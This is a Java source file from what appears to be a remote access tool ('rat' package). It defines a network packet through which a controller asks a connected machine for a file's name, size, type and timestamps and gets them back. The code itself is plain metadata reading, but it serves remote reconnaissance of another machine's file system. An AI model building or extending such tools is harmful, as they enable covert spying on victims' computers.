/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.BasicFileAttributes;

import de.sogomn.rat.ActiveConnection;

public final class FileInformationPacket extends AbstractPingPongPacket {
	
	private String name, path;
	private long size;
	private byte fileType;
	private long creationTime, lastAccess, lastModified;
	
	private static final byte FILE = 0;
	private static final byte DIRECTORY = 1;
	private static final String FILE_SEPARATOR = "/";
	
	public FileInformationPacket(final String path) {
		this.path = path;
		
		name = "";
	}
	
	public FileInformationPacket() {
		name = path = "";
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeUtf(path);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUtf(name);
		connection.writeUtf(path);
		connection.writeLong(size);
		connection.writeByte(fileType);
		connection.writeLong(creationTime);
		connection.writeLong(lastAccess);
		connection.writeLong(lastModified);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		path = connection.readUtf();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		name = connection.readUtf();
		path = connection.readUtf();
		size = connection.readLong();
		fileType = connection.readByte();
		creationTime = connection.readLong();
		lastAccess = connection.readLong();
		lastModified = connection.readLong();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		if (path.isEmpty() || path.equals(FILE_SEPARATOR)) {
			return;
		}
		
		final File file = new File(path);
		final Path filePath = file.toPath();
		
		try {
			final BasicFileAttributes attributes = Files.readAttributes(filePath, BasicFileAttributes.class);
			
			name = file.getName();
			path = file.getAbsolutePath();
			size = attributes.size();
			fileType = attributes.isDirectory() ? DIRECTORY : FILE;
			creationTime = attributes.creationTime().toMillis();
			lastAccess = attributes.lastAccessTime().toMillis();
			lastModified = attributes.lastModifiedTime().toMillis();
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
		
		type = DATA;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getPath() {
		return path;
	}
	
	public long getSize() {
		return size;
	}
	
	public boolean isDirectory() {
		return fileType == DIRECTORY;
	}
	
	public long getCreationTime() {
		return creationTime;
	}
	
	public long getLastAccess() {
		return lastAccess;
	}
	
	public long getLastModified() {
		return lastModified;
	}
	
}
